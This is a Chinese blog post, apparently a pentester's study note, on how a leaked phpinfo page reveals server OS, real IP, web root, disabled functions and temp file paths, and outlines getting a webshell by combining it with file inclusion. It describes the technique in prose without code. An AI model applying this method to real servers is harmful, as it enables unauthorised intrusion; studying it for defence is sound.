<p>phpinfo文件泄露一直被大家所忽视，但其实phpinfo可以为攻击渗透测试人员提供很多的信息。</p>
<p>1.system</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215927019.png" alt="image-20200928215927019"></p>
<p>提供服务器所在的操作系统的信息。</p>
<p>2.真实ip</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215935664.png" alt="image-20200928215935664"></p>
<p>知道真实ip的我们可以省去cdn带来的各种困扰。我们同时也可以端口旁站一顿操作。</p>
<p> 3.web根目录</p>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215944121.png" alt="image-20200928215944121"></p>
<p>网站绝对路径对渗透测试相当的有用，当你找到SQL注入点时，要上传木马的时候就需要知道网站的绝对路径才可以获取webshell。假如该网站使用的是如xampp之类的快速搭建的软件，你便可以寻找该软件对应的漏洞去尝试攻击目标网站。</p>
<ol>
<li>disable_functions</li>
</ol>
<p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p>
<p>通过disable_functions你可以了解到该网站禁用了些什么函数，然后去绕过代码执行和编写webshell时遇到的问题。</p>
<ol>
<li>临时文件路径</li>
<li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li>
</ol>
<p>这次通过phpinfo来getshell的关键，phpinfo可以让我们获得临时文件路径。向phpinfo页面post恶意代码，可以在_FILES[“file1”]中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。</p>

    
  </div>

</article>


   

   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">Close</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              Blog
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              Tag
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              About
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
    <div id="comment" class="vcomment" ></div>
    <script>
        var notify = 'true' == true ? true : false;
        var verify = 'true' == true ? true : false;
        var GUEST_INFO = ['nick','mail','link'];
        var guest_info = 'nick,mail,link'.split(',').filter(function(item){
            return GUEST_INFO.indexOf(item) > -1
        });
        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
        window.valine = new Valine({
            el: '.vcomment',
            notify: notify,
            verify: verify,
            appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
            appKey: "FL93w3BBbF9lxiR8X1HI58En",
            avatar:'wavatar',
            placeholder: "Just go go",
            guest_info:guest_info,
            pageSize:'6'
        });
    </script>
  
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<!-- <script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>-->
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>
